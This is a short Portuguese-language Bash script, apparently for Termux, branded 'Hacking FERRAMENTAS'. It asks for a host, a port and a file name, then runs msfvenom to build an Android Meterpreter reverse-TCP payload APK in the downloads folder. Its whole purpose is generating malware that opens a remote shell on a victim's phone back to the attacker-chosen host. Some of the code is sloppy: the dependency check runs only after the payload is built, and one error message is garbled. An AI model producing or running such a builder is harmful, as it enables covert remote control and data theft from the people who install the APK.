clear


trap user_interrupt SIGINT
trap user_interrupt SIGTSTP
function user_interrupt(){
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t Obrigado pela preferencia ;p, saindo...\n"
        sleep 2
        printf "\e[0m\n"
        exit 1
}


function dependencias() {
    command -v figlet > /dev/null 2>&1 || { echo >&2 "você precisa do php instalado, digite: você não tem o figlet instalado, instale para continuar"; exit 1; }
    
    command -v cowsay > /dev/null 2>&1 || { echo >&2 "você não tem o cowsay instalado, instale para continuar"; exit 1; }
    
    command -v metasploit > /dev/null 2>&1 || { echo >&2 "você não tem o metasploit instalado, instale para continuar"; exit 1; }
}

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mAutor: Senhor-Loock\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mEdited by:0x0a λ\e[0m\n"

cowsay -f eyes "Hacking" | lolcat
figlet -f slant "FERRAMENTAS" | lolcat

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mlocalhost [H]:" 
  read host

clear

cowsay -f eyes "Hacking" | lolcat
figlet -f slant "FERRAMENTAS" | lolcat

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mport [P]:\e[0m\n" 
   read port

clear

cowsay -f eyes "Hacking" | lolcat
figlet -f slant "FERRAMENTAS" | lolcat

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mNome do apk:Exemplo paylaod.apk:\e[0m\n" 
   read name

clear

cowsay -f eyes "Hacking" | lolcat
figlet -f slant "FERRAMENTAS" | lolcat

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mCriando $name\e[0m\n"

msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> /data/data/com.termux/files/home/storage/downloads/$name

clear

cd ..

bash Auxiliar.sh

dependencias
